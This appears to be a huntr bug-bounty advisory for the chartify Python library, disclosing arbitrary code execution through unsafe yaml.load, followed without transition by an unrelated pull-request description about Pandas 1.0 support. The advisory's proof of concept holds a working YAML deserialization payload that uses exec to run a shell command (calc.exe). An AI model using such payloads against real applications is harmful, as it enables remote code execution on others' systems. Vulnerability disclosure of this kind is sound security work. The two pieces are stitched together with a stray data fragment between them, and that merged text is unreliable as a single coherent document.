Vulnerability README | https://github.com/418sec/huntr/blob/master/bounties/pip/chartify/1/README.md

### User Comments:

### üìä Metadata *
Arbitrary code exec vulnerability 

#### Bounty URL:  https://www.huntr.dev/bounties/1-pip-chartify

### ‚öôÔ∏è Description *

Chartify is a Python library that makes it easy for data scientists to create charts. This package was vulnerable to Arbitrary code execution via Insecure YAML deserialization due to the use of a known vulnerable function load() in yaml.

### üíª Technical Description *

This package was vulnerable to Arbitrary code execution due to the use of a known vulnerable function load() in YAML. Changing that to safe_load or using SafeLoader will fix the issue.

### üêõ Proof of Concept (PoC) *

Install the package and run the below code:
```#!/usr/bin/env python3
from chartify._core.colors import *

payload = '''
!!python/object/new:type
  args: [""z"", !!python/tuple [], {""extend"": !!python/name:exec }]
  listitems: ""__import__('os').system('calc.exe')""
'''
open('pwn.yml', 'w+').write(payload)

CustomColors.from_yaml('hek', 'pwn.yml')
print(""pwned üè¥"")
```


### üî• Proof of Fix (PoF) *

After applying the fix, run the PoC again, `calc` wont pop and no code will be executed. Hence code exec is mitigated.


### üëç User Acceptance Testing (UAT)

Only `SafeLoader` is used, which is the safer function, no breaking changes introduced.",1,6,[]

Pandas 1.0 has been out for a few months, and seems stable enough that we should start supporting it!

In addition, I noticed some inconsistencies between versions used in the package requirements itself,
and in the requirements specified for local development. These have now been rectified (and future-proofed)
by including the package `requirements.txt` from the dev one instead of specifying everything twice.

**Special notes for your reviewer**:

On my local setup (Windows with WSL) there are some problems with chromedriver that I haven't been
able to figure out. Because of this, saving images as png doesn't work, and thus that test has been
skipped when I've tested locally. I doubt that it would make a difference for this change, but might
be worth double-checking in the PR builds.
